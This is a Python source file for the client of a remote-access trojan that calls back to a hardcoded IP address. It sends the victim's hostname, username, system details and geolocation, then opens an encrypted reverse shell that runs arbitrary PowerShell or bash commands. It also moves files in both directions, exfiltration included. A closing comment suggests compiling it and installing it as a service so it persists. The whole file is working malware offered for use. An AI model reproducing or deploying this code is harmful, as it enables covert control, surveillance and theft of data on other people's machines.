import socket
import os
import subprocess
import json
import time
import requests
import platform
import threading
import rsa
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes
import importlib




class colour:
    END         = "\033[0m"
    
    FG_GRAY     = "\033[30m"
    FG_RED      = "\033[31m"
    FG_GREEN    = "\033[32m"
    FG_YELLOW   = "\033[33m"
    FG_BLUE     = "\033[34m"
    FG_PURPLE   = "\033[35m"
    FG_CYAN     = "\033[36m"
    
    
HOST = "192.168.110.107"
PORT = 6565
test_PORT = 2121
running =False
aes_key= b''

###################################################################################################
################                        Encrytion                        ##########################
###################################################################################################


### first function take AES key from server and send with rsa, other 2 use key for encrypt and decrypt
def key_generator(client):
    (publickey, privatekey) = rsa.newkeys(1024)
    client.send(publickey.save_pkcs1("PEM"))
    aes_key = rsa.decrypt(client.recv(4096),privatekey)
    return aes_key

def encrypt_data(data):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(aes_key, AES.MODE_CBC,iv)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data):
    try:
        iv = encrypted_data[:AES.block_size]
        ciphertext = encrypted_data[AES.block_size:]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_data
    except Exception as e:
        print(e)


###################################################################################################
################                      send/recv                          ##########################
###################################################################################################

### As server, using for send and recv data with socket from same fucktion
def resv(client):
    return decrypt_data(client.recv(409632)).decode()
 

def send(client,enc):
    if 'bytes' in str(type(enc)):
        client.send(encrypt_data(enc))
    else:    
        client.send(encrypt_data(enc.encode()))

###################################################################################################
################                           x                             ##########################
###################################################################################################

### checkin status from server, if true or -1 connection run, if false wait again
def check_status():
    try:
        hostname = socket.gethostname()
        test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        test.connect((HOST,test_PORT))
        test.send(hostname.encode())
        status = test.recv(409600).decode()
        return status
    except :
        pass
    
### send default information at first connection
def first_connect(client):
    try:
        send(client,socket.gethostname())
        answer = resv(client)
        ipinfo = json.loads(requests.get("https://ipinfo.io").content.decode())

        if answer == "whoareyou":
            print("hello")
            info = {
            "city": ipinfo["city"],
            "country" : ipinfo["country"],
            "username" : os.getlogin(),
            "system" : platform.uname().system,
            "machine": platform.uname().machine,
            "version": platform.uname().version,
            }
            info =json.dumps(info)
            send(client,info)
    except:
        print("u")



### revShell
def connect(client):
    os_name = os.name
    while True:
        send(client,os.getcwd())
        
        command = resv(client)
        print(command)
        try:
            match command.split()[0]:
                
                case "cd":
                    os.chdir(command.split()[1])
                    send(client,"\n")
                    continue
                case "close":
                    send(client,f"{colour.FG_YELLOW}[*] Connection closed.\n{colour.END}")
                    break
                case "ftp":
                    stdout = ftp(command.split(),client)
                    time.sleep(0.4)
                    send(client,stdout)
                    time.sleep(0.4)
                    continue
            
            
            if os_name == "nt":
                stdout = subprocess.check_output(["powershell.exe", "-Command",command],shell=True)
            elif os_name == "posix":
                stdout = subprocess.check_output(["/bin/bash", "-c",command],shell=False)
                
        except Exception as e :
            print(e)
            stdout = (f"{colour.FG_RED}[*] Command Not Found !!!\n{colour.FG_RED}").encode()
            
        if stdout:
            send(client,stdout.decode('utf-8'))
        else:
            send(client,"\n")
        time.sleep(0.3)

### file transfer, same as server
def ftp(command,client):
    tip = command[1]
    file = command[2]

    

    def download(file,client):
        size = int(decrypt_data(client.recv(4128)).decode('utf-8'))
        if size == -1:
            return f"{colour.FG_RED}[*] File not found !!!\n{colour.END}"
        client.send(b"Naber Aslan")
        while os.path.exists(file) : 
            file += '(new)'
        chunk = decrypt_data(client.recv(4128))
        with open(file,'ab') as f:
            while chunk != b"\n\r":
                f.write(chunk)
                chunk = decrypt_data(client.recv(4128))
        return f"{colour.FG_GREEN}[*] Data uploaded successful.\n{colour.END}"

    def upload(file,client):
        try:
            with open(f"./{file}",'rb') as f:
                client.send(encrypt_data(b'1'))
                client.recv(4096)
                chunk = f.read(4096)
                while chunk :
                    client.send(encrypt_data(chunk))
                    chunk = f.read(4096)
                time.sleep(0.3)
                client.send(encrypt_data(b"\n\r"))
            return f"{colour.FG_GREEN}[*] Data downloaded successful.\n{colour.END}"
        except:
            client.send(b'-1')
            return f"{colour.FG_RED}[*] Not found !!!\n{colour.END}"
            
    if tip == "-u":
        return download(file,client)
    elif tip == "-d":
        return upload(file,client)
    else :
        return f"{colour.FG_RED}[*] Wrong command !!!\n{colour.END}"
    
### starting of party
def start_party():
    try:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect((HOST,PORT))
        global aes_key
        aes_key=key_generator(client)
        first_connect(client)
        while 1:
            try:
                command = resv(client)
                match command:
                        case "connect":
                            connect(client)
                        case "exit":
                            client.close()
                            break   
            except:
                global running
                running = False
                break
    except: 
        print("s")
        client.close() 


###################################################################################################
################                     Copyright by Memo                   ##########################
###################################################################################################

### check libraries, if not downloaded then download
try:
    importlib.import_module("rsa")
except:
    os.system("pip install rsa")

try:
    importlib.import_module("pycryptodome")
except:
    os.system("pip install pycryptodome")

try:
    importlib.import_module("requests")
except:
    os.system("pip install requests")
############################################

### if you want to convert to binary file , delete while and then create service for run this binary.
### It run each time by itself.
while True:
    Timer = random.randit(20,200)
    time.sleep(Timer)
    status = check_status()
    print(status,running)
    if (status == "True" and running == False) or status == "-1":
        start_thread = threading.Thread(target=start_party)
        start_thread.start()
        running = True
    elif status == "False" and running == True:
        running = False